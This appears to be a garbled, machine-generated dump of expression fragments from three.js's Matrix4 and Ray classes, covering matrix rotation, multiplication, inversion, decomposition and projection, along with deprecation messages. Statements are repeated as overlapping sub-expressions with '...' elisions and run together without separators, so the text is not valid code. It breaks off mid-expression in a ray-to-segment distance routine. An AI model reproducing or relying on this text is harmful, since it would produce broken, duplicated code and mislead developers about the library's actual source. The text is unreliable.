n44;te[15] = n44this.el ... ents );this.el ... ments )extract ... ;\r\n\r\n\t}console ... ().' );console ... n().' )'DEPREC ... ion().'DEPRECATED: Matrix4's .extractPosition() has been renamed to .copyPosition().DEPRECATED: Matrix4's this.co ... on( m )this.copyPositioncopyPos ... ;\r\n\r\n\t}te[12] = me[12];te[12] = me[12]me[12]te[13] = me[13];te[13] = me[13]me[13]te[14] = me[14];te[14] = me[14]me[14]extract ... \n\r\n\t}()var sca ... ngth();scaleX  ... ength()1 / v1. ... ength()v1.set( ... ength()v1.set( ... .lengthv1.set( ... me[2] )scaleY  ... ength()v1.set( ... me[6] )scaleZ  ... ength()v1.set( ... e[10] )te[0] = ... scaleX;te[0] = ...  scaleXme[0] * scaleXte[1] = ... scaleX;te[1] = ...  scaleXme[1] * scaleXte[2] = ... scaleX;te[2] = ...  scaleXme[2] * scaleXte[4] = ... scaleY;te[4] = ...  scaleYme[4] * scaleYte[5] = ... scaleY;te[5] = ...  scaleYme[5] * scaleYte[6] = ... scaleY;te[6] = ...  scaleYme[6] * scaleYte[8] = ... scaleZ;te[8] = ...  scaleZme[8] * scaleZte[9] = ... scaleZ;te[9] = ...  scaleZme[9] * scaleZte[10]  ... scaleZ;te[10]  ...  scaleZme[10] * scaleZmakeRot ... ;\r\n\r\n\t}makeRot ... omEulerERROR: Matrix's .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.  Please update your code.ERROR: Matrix's var x = ... uler.z;x = euler.xeuler.xy = euler.yeuler.yz = euler.zeuler.zvar a = ... n( x );a = Math.cos( x )Math.cos( x )b = Math.sin( x )Math.sin( x )var c = ... n( y );c = Math.cos( y )Math.cos( y )d = Math.sin( y )Math.sin( y )var e = ... n( z );e = Math.cos( z )Math.cos( z )f = Math.sin( z )Math.sin( z )var ae  ...  b * f;ae = a * ea * eaf = a * fa * fbe = b * eb * ebf = b * fb * fte[0] = c * e;te[0] = c * ec * ete[4] = - c * f;te[4] = - c * f- c * f- cte[8] = d;te[8] = dte[1] = af + be * d;te[1] = af + be * daf + be * dbe * dte[5] = ae - bf * d;te[5] = ae - bf * dae - bf * dbf * dte[9] = - b * c;te[9] = - b * c- b * c- bte[2] = bf - ae * d;te[2] = bf - ae * dbf - ae * dae * dte[6] = be + af * d;te[6] = be + af * dbe + af * daf * dte[10] = a * c;te[10] = a * ca * cvar ce  ...  d * f;ce = c * ecf = c * fc * fde = d * ed * edf = d * fd * fte[0] = ce + df * b;te[0] = ce + df * bce + df * bdf * bte[4] = de * b - cf;te[4] = de * b - cfde * b - cfde * bte[8] = a * d;te[8] = a * da * dte[1] = a * f;te[1] = a * fte[5] = a * e;te[5] = a * ete[9] = - b;te[9] = - bte[2] = cf * b - de;te[2] = cf * b - decf * b - decf * bte[6] = df + ce * b;te[6] = df + ce * bdf + ce * bce * bte[0] = ce - df * b;te[0] = ce - df * bce - df * bte[4] = - a * f;te[4] = - a * f- a * f- ate[8] = de + cf * b;te[8] = de + cf * bde + cf * bte[1] = cf + de * b;te[1] = cf + de * bcf + de * bte[9] = df - ce * b;te[9] = df - ce * bdf - ce * bte[2] = - a * d;te[2] = - a * d- a * dte[6] = b;te[6] = bte[4] = be * d - af;te[4] = be * d - afbe * d - afte[8] = ae * d + bf;te[8] = ae * d + bfae * d + bfte[1] = c * f;te[1] = c * fte[5] = bf * d + ae;te[5] = bf * d + aebf * d + aete[9] = af * d - be;te[9] = af * d - beaf * d - bete[2] = - d;te[2] = - d- dte[6] = b * c;te[6] = b * cb * cvar ac  ...  b * d;ac = a * cad = a * dbc = b * cbd = b * db * dte[4] = bd - ac * f;te[4] = bd - ac * fbd - ac * fac * fte[8] = bc * f + ad;te[8] = bc * f + adbc * f + adbc * fte[1] = f;te[1] = fte[9] = - b * e;te[9] = - b * e- b * ete[2] = - d * e;te[2] = - d * e- d * ete[6] = ad * f + bc;te[6] = ad * f + bcad * f + bcad * fte[10]  ... bd * f;te[10] = ac - bd * fac - bd * fbd * fte[4] = - f;te[4] = - f- fte[8] = d * e;te[8] = d * ete[1] = ac * f + bd;te[1] = ac * f + bdac * f + bdte[9] = ad * f - bc;te[9] = ad * f - bcad * f - bcte[2] = bc * f - ad;te[2] = bc * f - adbc * f - adte[6] = b * e;te[6] = b * ete[10]  ... f + ac;te[10] = bd * f + acbd * f + acte[3] = 0;te[3] = 0te[7] = 0;te[7] = 0te[11] = 0;te[11] = 0te[12] = 0;te[12] = 0te[13] = 0;te[13] = 0te[14] = 0;te[14] = 0te[15] = 1;te[15] = 1setRota ... ;\r\n\r\n\t}setRota ... ternion'DEPREC ...  code.'DEPRECATED: Matrix4's .setRotationFromQuaternion() has been deprecated in favor of makeRotationFromQuaternion.  Please update your code. has been deprecated in favor of makeRotationFromQuaternionreturn  ... n( q );this.ma ... on( q )this.ma ... ternionmakeRot ... ternionvar x = ...  = q.w;x = q.xy = q.yz = q.zw = q.wvar x2  ...  z + z;x2 = x + xx + xy2 = y + yy + yz2 = z + zz + zvar xx  ... x * z2;xx = x * x2x * x2xy = x * y2x * y2xz = x * z2x * z2var yy  ... z * z2;yy = y * y2y * y2yz = y * z2y * z2zz = z * z2z * z2var wx  ... w * z2;wx = w * x2w * x2wy = w * y2w * y2wz = w * z2w * z2te[0] = ... + zz );te[0] = ...  + zz )1 - ( yy + zz )( yy + zz )yy + zzte[4] = xy - wz;te[4] = xy - wzxy - wzte[8] = xz + wy;te[8] = xz + wyxz + wyte[1] = xy + wz;te[1] = xy + wzxy + wzte[5] = ... + zz );te[5] = ...  + zz )1 - ( xx + zz )( xx + zz )xx + zzte[9] = yz - wx;te[9] = yz - wxyz - wxte[2] = xz - wy;te[2] = xz - wyxz - wyte[6] = yz + wx;te[6] = yz + wxyz + wxte[10]  ... + yy );te[10]  ...  + yy )1 - ( xx + yy )( xx + yy )xx + yylookAt: ... \n\r\n\t}()var x = ... tor3();x = new ... ctor3()var y = ... tor3();y = new ... ctor3()var z = ... tor3();z = new ... ctor3()z.subVe ... lize();z.subVe ... alize()z.subVe ... rmalizez.subVe ... arget )z.subVectorsif ( z. ... \n\r\n\t\t\t}z.length() === 0z.length()z.lengthz.z = 1;z.z = 1z.zx.cross ... lize();x.cross ... alize()x.cross ... rmalizex.cross ... up, z )x.crossVectorsif ( x. ... \n\r\n\t\t\t}x.length() === 0x.length()x.lengthz.x += 0.0001;z.x += 0.0001z.xy.cross ... z, x );y.cross ...  z, x )y.crossVectorste[0] = x.x;te[0] = x.xx.xte[4] = y.x;te[4] = y.xy.xte[8] = z.x;te[8] = z.xte[1] = x.y;te[1] = x.yx.yte[5] = y.y;te[5] = y.yy.yte[9] = z.y;te[9] = z.yz.yte[2] = x.z;te[2] = x.zx.zte[6] = y.z;te[6] = y.zy.zte[10] = z.z;te[10] = z.zif ( n  ... \r\n\r\n\t\t}n !== undefinedDEPRECATED: Matrix4's .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead.return  ... m, n );this.mu ...  m, n )this.mu ... atricesreturn  ... s, m );this.mu ... is, m )var ae = a.elements;ae = a.elementsa.elementsvar be = b.elements;be = b.elementsb.elementsvar a11 ... ae[12];a11 = ae[0]ae[0]a12 = ae[4]ae[4]a13 = ae[8]ae[8]a14 = ae[12]ae[12]var a21 ... ae[13];a21 = ae[1]ae[1]a22 = ae[5]ae[5]a23 = ae[9]ae[9]a24 = ae[13]ae[13]var a31 ... ae[14];a31 = ae[2]ae[2]a32 = ae[6]ae[6]a33 = ae[10]ae[10]a34 = ae[14]ae[14]var a41 ... ae[15];a41 = ae[3]ae[3]a42 = ae[7]ae[7]a43 = ae[11]ae[11]a44 = ae[15]ae[15]var b11 ... be[12];b11 = be[0]be[0]b12 = be[4]be[4]b13 = be[8]be[8]b14 = be[12]be[12]var b21 ... be[13];b21 = be[1]be[1]b22 = be[5]be[5]b23 = be[9]be[9]b24 = be[13]be[13]var b31 ... be[14];b31 = be[2]be[2]b32 = be[6]be[6]b33 = be[10]be[10]b34 = be[14]be[14]var b41 ... be[15];b41 = be[3]be[3]b42 = be[7]be[7]b43 = be[11]be[11]b44 = be[15]be[15]te[0] = ...  * b41;te[0] = ... 4 * b41a11 * b ... 4 * b41a11 * b ... 3 * b31a11 * b ... 2 * b21a11 * b11a12 * b21a13 * b31a14 * b41te[4] = ...  * b42;te[4] = ... 4 * b42a11 * b ... 4 * b42a11 * b ... 3 * b32a11 * b ... 2 * b22a11 * b12a12 * b22a13 * b32a14 * b42te[8] = ...  * b43;te[8] = ... 4 * b43a11 * b ... 4 * b43a11 * b ... 3 * b33a11 * b ... 2 * b23a11 * b13a12 * b23a13 * b33a14 * b43te[12]  ...  * b44;te[12]  ... 4 * b44a11 * b ... 4 * b44a11 * b ... 3 * b34a11 * b ... 2 * b24a11 * b14a12 * b24a13 * b34a14 * b44te[1] = ...  * b41;te[1] = ... 4 * b41a21 * b ... 4 * b41a21 * b ... 3 * b31a21 * b ... 2 * b21a21 * b11a22 * b21a23 * b31a24 * b41te[5] = ...  * b42;te[5] = ... 4 * b42a21 * b ... 4 * b42a21 * b ... 3 * b32a21 * b ... 2 * b22a21 * b12a22 * b22a23 * b32a24 * b42te[9] = ...  * b43;te[9] = ... 4 * b43a21 * b ... 4 * b43a21 * b ... 3 * b33a21 * b ... 2 * b23a21 * b13a22 * b23a23 * b33a24 * b43te[13]  ...  * b44;te[13]  ... 4 * b44a21 * b ... 4 * b44a21 * b ... 3 * b34a21 * b ... 2 * b24a21 * b14a22 * b24a23 * b34a24 * b44te[2] = ...  * b41;te[2] = ... 4 * b41a31 * b ... 4 * b41a31 * b ... 3 * b31a31 * b ... 2 * b21a31 * b11a32 * b21a33 * b31a34 * b41te[6] = ...  * b42;te[6] = ... 4 * b42a31 * b ... 4 * b42a31 * b ... 3 * b32a31 * b ... 2 * b22a31 * b12a32 * b22a33 * b32a34 * b42te[10]  ...  * b43;te[10]  ... 4 * b43a31 * b ... 4 * b43a31 * b ... 3 * b33a31 * b ... 2 * b23a31 * b13a32 * b23a33 * b33a34 * b43te[14]  ...  * b44;te[14]  ... 4 * b44a31 * b ... 4 * b44a31 * b ... 3 * b34a31 * b ... 2 * b24a31 * b14a32 * b24a33 * b34a34 * b44te[3] = ...  * b41;te[3] = ... 4 * b41a41 * b ... 4 * b41a41 * b ... 3 * b31a41 * b ... 2 * b21a41 * b11a42 * b21a43 * b31a44 * b41te[7] = ...  * b42;te[7] = ... 4 * b42a41 * b ... 4 * b42a41 * b ... 3 * b32a41 * b ... 2 * b22a41 * b12a42 * b22a43 * b32a44 * b42te[11]  ...  * b43;te[11]  ... 4 * b43a41 * b ... 4 * b43a41 * b ... 3 * b33a41 * b ... 2 * b23a41 * b13a42 * b23a43 * b33a44 * b43te[15]  ...  * b44;te[15]  ... 4 * b44a41 * b ... 4 * b44a41 * b ... 3 * b34a41 * b ... 2 * b24a41 * b14a42 * b24a43 * b34a44 * b44this.mu ... a, b );this.mu ...  a, b )r[ 0 ] = te[0];r[ 0 ] = te[0]r[ 1 ] = te[1];r[ 1 ] = te[1]r[ 2 ] = te[2];r[ 2 ] = te[2]r[ 3 ] = te[3];r[ 3 ] = te[3]r[ 4 ] = te[4];r[ 4 ] = te[4]r[ 5 ] = te[5];r[ 5 ] = te[5]r[ 6 ] = te[6];r[ 6 ] = te[6]r[ 7 ] = te[7];r[ 7 ] = te[7]r[ 8 ]  = te[8];r[ 8 ]  = te[8]r[ 9 ]  = te[9];r[ 9 ]  = te[9]r[ 9 ]r[ 10 ] = te[10];r[ 10 ] = te[10]r[ 10 ]r[ 11 ] = te[11];r[ 11 ] = te[11]r[ 11 ]r[ 12 ] = te[12];r[ 12 ] = te[12]r[ 12 ]r[ 13 ] = te[13];r[ 13 ] = te[13]r[ 13 ]r[ 14 ] = te[14];r[ 14 ] = te[14]r[ 14 ]r[ 15 ] = te[15];r[ 15 ] = te[15]r[ 15 ]te[12] *= s;te[12] *= ste[9] *= s;te[9] *= ste[13] *= s;te[13] *= ste[10] *= s;te[10] *= ste[14] *= s;te[14] *= ste[11] *= s;te[11] *= ste[15] *= s;te[15] *= sDEPRECATED: Matrix4's .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) or vector.applyProjection( matrix ) instead. or vectorvector. ... jectionDEPRECATED: Matrix4's .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead.vector.applyMatrix4DEPRECATED: Matrix4's .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.rotateA ... ;\r\n\r\n\t}DEPRECATED: Matrix4's .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead. Use Vector3v.trans ... this );v.trans ...  this )v.transformDirectionDEPRECATED: Matrix4's .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead.var n11 ... te[12];n11 = te[0]n12 = te[4]n13 = te[8]n14 = te[12]var n21 ... te[13];n21 = te[1]n22 = te[5]n23 = te[9]n24 = te[13]var n31 ... te[14];n31 = te[2]n32 = te[6]n33 = te[10]n34 = te[14]var n41 ... te[15];n41 = te[3]n42 = te[7]n43 = te[11]n44 = te[15](\r\n\t\t\tn ... \r\n\r\n\t\t)n41 * ( ... 1\r\n\t\t\t)n41 * ( ... 4\r\n\t\t\t)(\r\n\t\t\t\t ... 4\r\n\t\t\t)+n14 *  ... 3 * n34+n14 *  ... 2 * n34+n14 *  ... 4 * n33+n14 *  ... 2 * n33+n14 *  ... 4 * n32+n14 * n23 * n32+n14 * n23+n14n13 * n24 * n32n13 * n24n14 * n22 * n33n14 * n22n12 * n24 * n33n12 * n24n13 * n22 * n34n13 * n22n12 * n23 * n34n12 * n23n42 * ( ... 1\r\n\t\t\t)(\r\n\t\t\t\t ... 1\r\n\t\t\t)+n11 *  ... 3 * n31+n11 *  ... 4 * n31+n11 *  ... 1 * n34+n11 *  ... 1 * n33+n11 *  ... 4 * n33+n11 * n23 * n34+n11 * n23+n11n11 * n24 * n33n11 * n24n14 * n21 * n33n14 * n21n13 * n21 * n34n13 * n21n13 * n24 * n31n14 * n23 * n31n14 * n23n43 * ( ... 1\r\n\t\t\t)+n11 *  ... 2 * n31+n11 *  ... 1 * n32+n11 *  ... 2 * n34+n11 * n24 * n32+n11 * n24n11 * n22 * n34n11 * n22n14 * n21 * n32n12 * n21 * n34n12 * n21n14 * n22 * n31n12 * n24 * n31n44 * ( ... 1\r\n\t\t\t)-n13 *  ... 3 * n31-n13 *  ... 1 * n33-n13 *  ... 1 * n32-n13 *  ... 2 * n33-n13 *  ... 3 * n32-n13 * n22 * n31-n13 * n22-n13n11 * n23 * n32n11 * n23n11 * n22 * n33n13 * n21 * n32n12 * n21 * n33n12 * n23 * n31var tmp;tmp = te[1];tmp = te[1]te[1] = te[4];te[1] = te[4]te[4] = tmp;te[4] = tmptmp = te[2];tmp = te[2]te[2] = te[8];te[2] = te[8]te[8] = tmp;te[8] = tmptmp = te[6];tmp = te[6]te[6] = te[9];te[6] = te[9]te[9] = tmp;te[9] = tmptmp = te[3];tmp = te[3]te[3] = te[12];te[3] = te[12]te[12] = tmp;te[12] = tmptmp = te[7];tmp = te[7]te[7] = te[13];te[7] = te[13]te[13] = tmp;te[13] = tmptmp = te[11];tmp = te[11]te[11] = te[14];te[11] = te[14]te[14] = tmp;te[14] = tmparray[  ...  te[9];array[  ... = te[9]array[ offset + 9 ]offset + 9array[  ... te[10];array[  ...  te[10]array[ offset + 10 ]offset + 10array[  ... te[11];array[  ...  te[11]array[ offset + 11 ]offset + 11array[  ... te[12];array[  ...  te[12]array[ offset + 12 ]offset + 12array[  ... te[13];array[  ...  te[13]array[ offset + 13 ]offset + 13array[  ... te[14];array[  ...  te[14]array[ offset + 14 ]offset + 14array[  ... te[15];array[  ...  te[15]array[ offset + 15 ]offset + 15getPosi ... \n\r\n\t}()DEPRECATED: Matrix4's .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead.return  ... [14] );v1.set( ... e[14] )setPosi ... ;\r\n\r\n\t}te[12] = v.x;te[12] = v.xte[13] = v.y;te[13] = v.yte[14] = v.z;te[14] = v.zvar n11 ... me[12];n11 = me[0]n12 = me[4]n13 = me[8]n14 = me[12]var n21 ... me[13];n21 = me[1]n22 = me[5]n23 = me[9]n24 = me[13]var n31 ... me[14];n31 = me[2]n32 = me[6]n33 = me[10]n34 = me[14]var n41 ... me[15];n41 = me[3]n42 = me[7]n43 = me[11]me[11]n44 = me[15]me[15]te[0] = ... 33*n44;te[0] = ... n33*n44n23*n34 ... n33*n44n23*n34 ... n32*n44n23*n34 ... n34*n43n23*n34 ... n32*n43n23*n34 ... n33*n42n23*n34*n42n23*n34n24*n33*n42n24*n33n24*n32*n43n24*n32n22*n34*n43n22*n34n23*n32*n44n23*n32n22*n33*n44n22*n33te[4] = ... 33*n44;te[4] = ... n33*n44n14*n33 ... n33*n44n14*n33 ... n32*n44n14*n33 ... n34*n43n14*n33 ... n32*n43n14*n33 ... n34*n42n14*n33*n42n14*n33n13*n34*n42n13*n34n14*n32*n43n14*n32n12*n34*n43n12*n34n13*n32*n44n13*n32n12*n33*n44n12*n33te[8] = ... 23*n44;te[8] = ... n23*n44n13*n24 ... n23*n44n13*n24 ... n22*n44n13*n24 ... n24*n43n13*n24 ... n22*n43n13*n24 ... n23*n42n13*n24*n42n13*n24n14*n23*n42n14*n23n14*n22*n43n14*n22n12*n24*n43n12*n24n13*n22*n44n13*n22n12*n23*n44n12*n23te[12]  ... 23*n34;te[12]  ... n23*n34n14*n23 ... n23*n34n14*n23 ... n22*n34n14*n23 ... n24*n33n14*n23 ... n22*n33n14*n23 ... n24*n32n14*n23*n32n13*n24*n32n14*n22*n33n12*n24*n33n13*n22*n34n12*n23*n34te[1] = ... 33*n44;te[1] = ... n33*n44n24*n33 ... n33*n44n24*n33 ... n31*n44n24*n33 ... n34*n43n24*n33 ... n31*n43n24*n33 ... n34*n41n24*n33*n41n23*n34*n41n24*n31*n43n24*n31n21*n34*n43n21*n34n23*n31*n44n23*n31n21*n33*n44n21*n33te[5] = ... 33*n44;te[5] = ... n33*n44n13*n34 ... n33*n44n13*n34 ... n31*n44n13*n34 ... n34*n43n13*n34 ... n31*n43n13*n34 ... n33*n41n13*n34*n41n14*n33*n41n14*n31*n43n14*n31n11*n34*n43n11*n34n13*n31*n44n13*n31n11*n33*n44n11*n33te[9] = ... 23*n44;te[9] = ... n23*n44n14*n23 ... n23*n44n14*n23 ... n21*n44n14*n23 ... n24*n43n14*n23 ... n21*n43n14*n23 ... n24*n41n14*n23*n41n13*n24*n41n14*n21*n43n14*n21n11*n24*n43n11*n24n13*n21*n44n13*n21n11*n23*n44n11*n23te[13]  ... 23*n34;te[13]  ... n23*n34n13*n24 ... n23*n34n13*n24 ... n21*n34n13*n24 ... n24*n33n13*n24 ... n21*n33n13*n24 ... n23*n31n13*n24*n31n14*n23*n31n14*n21*n33n11*n24*n33n13*n21*n34n11*n23*n34te[2] = ... 32*n44;te[2] = ... n32*n44n22*n34 ... n32*n44n22*n34 ... n31*n44n22*n34 ... n34*n42n22*n34 ... n31*n42n22*n34 ... n32*n41n22*n34*n41n24*n32*n41n24*n31*n42n21*n34*n42n22*n31*n44n22*n31n21*n32*n44n21*n32te[6] = ... 32*n44;te[6] = ... n32*n44n14*n32 ... n32*n44n14*n32 ... n31*n44n14*n32 ... n34*n42n14*n32 ... n31*n42n14*n32 ... n34*n41n14*n32*n41n12*n34*n41n14*n31*n42n11*n34*n42n12*n31*n44n12*n31n11*n32*n44n11*n32te[10]  ... 22*n44;te[10]  ... n22*n44n12*n24 ... n22*n44n12*n24 ... n21*n44n12*n24 ... n24*n42n12*n24 ... n21*n42n12*n24 ... n22*n41n12*n24*n41n14*n22*n41n14*n21*n42n11*n24*n42n12*n21*n44n12*n21n11*n22*n44n11*n22te[14]  ... 22*n34;te[14]  ... n22*n34n14*n22 ... n22*n34n14*n22 ... n21*n34n14*n22 ... n24*n32n14*n22 ... n21*n32n14*n22 ... n24*n31n14*n22*n31n12*n24*n31n14*n21*n32n11*n24*n32n12*n21*n34n11*n22*n34te[3] = ... 32*n43;te[3] = ... n32*n43n23*n32 ... n32*n43n23*n32 ... n31*n43n23*n32 ... n33*n42n23*n32 ... n31*n42n23*n32 ... n33*n41n23*n32*n41n22*n33*n41n23*n31*n42n21*n33*n42n22*n31*n43n21*n32*n43te[7] = ... 32*n43;te[7] = ... n32*n43n12*n33 ... n32*n43n12*n33 ... n31*n43n12*n33 ... n33*n42n12*n33 ... n31*n42n12*n33 ... n32*n41n12*n33*n41n13*n32*n41n13*n31*n42n11*n33*n42n12*n31*n43n11*n32*n43te[11]  ... 22*n43;te[11]  ... n22*n43n13*n22 ... n22*n43n13*n22 ... n21*n43n13*n22 ... n23*n42n13*n22 ... n21*n42n13*n22 ... n23*n41n13*n22*n41n12*n23*n41n13*n21*n42n11*n23*n42n12*n21*n43n11*n22*n43te[15]  ... 22*n33;te[15]  ... n22*n33n12*n23 ... n22*n33n12*n23 ... n21*n33n12*n23 ... n23*n32n12*n23 ... n21*n32n12*n23 ... n22*n31n12*n23*n31n13*n22*n31n13*n21*n32n11*n23*n32n12*n21*n33n11*n22*n33var det ... [ 12 ];det = n ... e[ 12 ]n11 * t ... e[ 12 ]n11 * t ... te[ 8 ]n11 * t ... te[ 4 ]n11 * te[ 0 ]n21 * te[ 4 ]n31 * te[ 8 ]n41 * te[ 12 ]te[ 12 ]if ( de ... s;\r\n\t\t}det == 0{\r\n\r\n\t\t ... s;\r\n\t\t}Matrix4.getInverse(): can't invert matrix, determinant is 01 / detconsole ... ved.');console ... oved.')'DEPREC ... moved.'DEPRECATED: Matrix4's .translate() has been removed.rotateX ... ;\r\n\r\n\t}DEPRECATED: Matrix4's .rotateX() has been removed.rotateY ... ;\r\n\r\n\t}DEPRECATED: Matrix4's .rotateY() has been removed.rotateZ ... ;\r\n\r\n\t}DEPRECATED: Matrix4's .rotateZ() has been removed.rotateB ... ;\r\n\r\n\t}DEPRECATED: Matrix4's .rotateByAxis() has been removed.scale:  ... ;\r\n\r\n\t}var x = ...  = v.z;x = v.xy = v.yz = v.zte[0] *= x;te[0] *= xte[4] *= y;te[4] *= yte[8] *= z;te[8] *= zte[1] *= x;te[1] *= xte[5] *= y;te[5] *= yte[9] *= z;te[9] *= zte[2] *= x;te[2] *= xte[6] *= y;te[6] *= yte[10] *= z;te[10] *= zte[3] *= x;te[3] *= xte[7] *= y;te[7] *= yte[11] *= z;te[11] *= zgetMaxS ... ;\r\n\r\n\t}var sca ...  te[2];scaleXS ... * te[2]te[0] * ... * te[2]te[0] * ... * te[1]te[0] * te[0]te[1] * te[1]te[2] * te[2]var sca ...  te[6];scaleYS ... * te[6]te[4] * ... * te[6]te[4] * ... * te[5]te[4] * te[4]te[5] * te[5]te[6] * te[6]var sca ... te[10];scaleZS ...  te[10]te[8] * ...  te[10]te[8] * ... * te[9]te[8] * te[8]te[9] * te[9]te[10] * te[10]Math.sq ... q ) ) )Math.ma ... ZSq ) )Math.ma ... leZSq )makeTra ... ;\r\n\r\n\t}var c = ... heta );c = Mat ... theta )s = Mat ... theta )-svar c = ... ngle );c = Mat ... angle )Math.cos( angle )var s = ... ngle );s = Mat ... angle )Math.sin( angle )var t = 1 - c;t = 1 - c1 - cvar x = ... axis.z;x = axis.xy = axis.yz = axis.zvar tx  ...  t * y;tx = t * xt * xty = t * yt * ytx * x + ctx * xtx * y - s * ztx * ys * ztx * z + s * ytx * zs * ytx * y + s * zty * y + cty * yty * z - s * xty * zs * xtx * z - s * yty * z + s * xt * z * z + ct * z * zt * zmakeSca ... ;\r\n\r\n\t}compose ... ;\r\n\r\n\t}this.ma ... nion );this.ma ... rnion )this.scale( scale );this.scale( scale )this.scalethis.se ... tion );this.se ... ition )this.setPositiondecompo ... \n\r\n\t}()var vec ... tor3();vector  ... ctor3()var mat ... rix4();matrix  ... trix4()new THREE.Matrix4()sx = ve ... ength()vector. ... ength()vector. ... .lengthvector. ... te[2] )vector.setsy = ve ... ength()vector. ... te[6] )sz = ve ... ength()vector. ... e[10] )var det ... nant();det = t ... inant()this.determinant()this.determinantif( det ... ;\r\n\t\t\t}det < 0{\r\n\t\t\t\t ... ;\r\n\t\t\t}sx = -sx;sx = -sx-sxposition.x = te[12];position.x = te[12]position.xposition.y = te[13];position.y = te[13]position.yposition.z = te[14];position.z = te[14]position.zmatrix. ... ents );matrix. ... ments )matrix.elements.setvar invSX = 1 / sx;invSX = 1 / sx1 / sxvar invSY = 1 / sy;invSY = 1 / sy1 / syvar invSZ = 1 / sz;invSZ = 1 / sz1 / szmatrix. ...  invSX;matrix. ... = invSXmatrix.elements[0]matrix.elements[1]matrix.elements[2]matrix. ...  invSY;matrix. ... = invSYmatrix.elements[4]matrix.elements[5]matrix.elements[6]matrix. ...  invSZ;matrix. ... = invSZmatrix.elements[8]matrix.elements[9]matrix.elements[10]quatern ... trix );quatern ... atrix )quatern ... nMatrixscale.x = sx;scale.x = sxscale.xscale.y = sy;scale.y = syscale.yscale.z = sz;scale.z = szscale.zmakeFru ... ;\r\n\r\n\t}var x = ... left );x = 2 * ...  left )2 * nea ...  left )2 * near( right - left )right - leftvar y = ... ttom );y = 2 * ... ottom )2 * nea ... ottom )( top - bottom )top - bottomvar a = ... left );a = ( r ...  left )( right ...  left )( right + left )right + leftvar b = ... ttom );b = ( t ... ottom )( top + ... ottom )( top + bottom )top + bottomvar c = ... near );c = - ( ...  near )- ( far ...  near )- ( far + near )( far + near )far + near( far - near )far - nearvar d = ... near );d = - 2 ...  near )- 2 * f ...  near )- 2 * far * near- 2 * far- 2te[0] = x;te[0] = xte[4] = 0;te[4] = 0te[8] = a;te[8] = ate[1] = 0;te[1] = 0te[5] = y;te[5] = yte[9] = b;te[9] = bte[2] = 0;te[2] = 0te[6] = 0;te[6] = 0te[10] = c;te[10] = cte[14] = d;te[14] = dte[11] = - 1;te[11] = - 1te[15] = 0;te[15] = 0makePer ... ;\r\n\r\n\t}var yma ... .5 ) );ymax =  ... 0.5 ) )near *  ... 0.5 ) )Math.ta ... 0.5 ) )THREE.M ... * 0.5 )THREE.Math.degToRadfov * 0.5var ymin = - ymax;ymin = - ymax- ymaxvar xmi ... aspect;xmin = ymin * aspectymin * aspectvar xma ... aspect;xmax = ymax * aspectymax * aspectreturn  ...  far );this.ma ... , far )this.makeFrustummakeOrt ... ;\r\n\r\n\t}var w = ... - left;w = right - leftvar h = ... bottom;h = top - bottomvar p = far - near;p = far - nearvar x = ...  ) / w;x = ( r ... t ) / w( right + left ) / wvar y = ...  ) / h;y = ( t ... m ) / h( top + bottom ) / hvar z = ...  ) / p;z = ( f ... r ) / p( far + near ) / pte[0] = 2 / w;te[0] = 2 / w2 / wte[8] = 0;te[8] = 0te[12] = -x;te[12] = -x-xte[5] = 2 / h;te[5] = 2 / h2 / hte[9] = 0;te[9] = 0te[13] = -y;te[13] = -y-yte[10] = -2/p;te[10] = -2/p-2/p-2te[14] = -z;te[14] = -z-zte[ 9 ]te[ 10 ]te[ 11 ]te[ 13 ]te[ 14 ]te[ 15 ]THREE.R ... );\r\n\r\n}THREE.Raythis.or ... tor3();this.or ... ctor3()this.origin( origi ... ctor3()( origi ... fined )origin !== undefinedthis.di ... tor3();this.di ... ctor3()this.direction( direc ... ctor3()( direc ... fined )directi ... definedTHREE.Ray.prototypeconstru ... REE.Raythis.or ... igin );this.or ... rigin )this.origin.copythis.di ... tion );this.di ... ction )this.direction.copyray.originray.directionreturn  ... igin );result. ... rigin )result. ... t ).addresult. ... ar( t )result. ... ction )recast: ... \n\r\n\t}()this.or ... v1 ) );this.or ...  v1 ) )this.at( t, v1 )this.atresult. ... igin );var dir ... tion );directi ... ction )result.dotif ( di ... \r\n\r\n\t\t}directi ... nce < 0result. ... e ).addresult. ... tance )v1.subV ... ction )v1.subV ... n ).dotv1.subV ... rigin )v1.subVectorsif ( di ... \n\r\n\t\t\t}return  ... oint );this.or ... point )this.or ... tanceTov1.copy ... igin );v1.copy ... rigin )v1.copy ... e ).addv1.copy ... tance )v1.copy ... ction )v1.dist ... point )v1.distanceTooptiona ... Segmentvar seg ...  0.5 );segCent ... ( 0.5 )v0.clon ... ( 0.5 )v0.clon ... yScalarv0.clone().add( v1 )v0.clone().addv0.clone()v0.clonevar seg ... lize();segDir  ... alize()v1.clon ... alize()v1.clon ... rmalizev1.clone().sub( v0 )v1.clone().subv1.clone()v1.clonevar seg ...  * 0.5;segExte ... ) * 0.5v0.dist ... ) * 0.5v0.distanceTo( v1 )v0.distanceTovar dif ... nter );diff =  ... enter )this.or ... enter )this.or ... e().subthis.origin.clone()this.origin.clonevar a01 ... gDir );a01 = - ... egDir )- this. ... egDir )this.di ... egDir )this.direction.dotvar b0  ... tion );b0 = di ... ction )diff.do ... ction )diff.dotvar b1  ... gDir );b1 = -  ... egDir )- diff.dot( segDir )diff.dot( segDir )var c = ... thSq();c = diff.lengthSq()diff.lengthSq()diff.lengthSqvar det ...  a01 );det = M ... * a01 )Math.ab ... * a01 )1 - a01 * a01a01 * a01var s0, ... extDet;det >= 0s0 = a01 * b1 - b0;s0 = a01 * b1 - b0a01 * b1 - b0a01 * b1s1 = a01 * b0 - b1;s1 = a01 * b0 - b1a01 * b0 - b1a01 * b0extDet  ...  * det;extDet  ... t * detsegExtent * detif ( s0 ... \n\r\n\t\t\t}s0 >= 0if ( s1 ... \r\n\t\t\t\t}s1 >= - extDet- extDetif ( s1 ... \n\t\t\t\t\t}s1 <= extDetvar inv ...  / det;invDet = 1 / dets0 *= invDet;s0 *= invDets1 *= invDet;s1 *= invDetsqrDist ...  ) + c;sqrDist ... 1 ) + cs0 * (  ... 1 ) + cs0 * (  ...  * b1 )s0 * (  ...  * b0 )( s0 +  ...  * b0 )s0 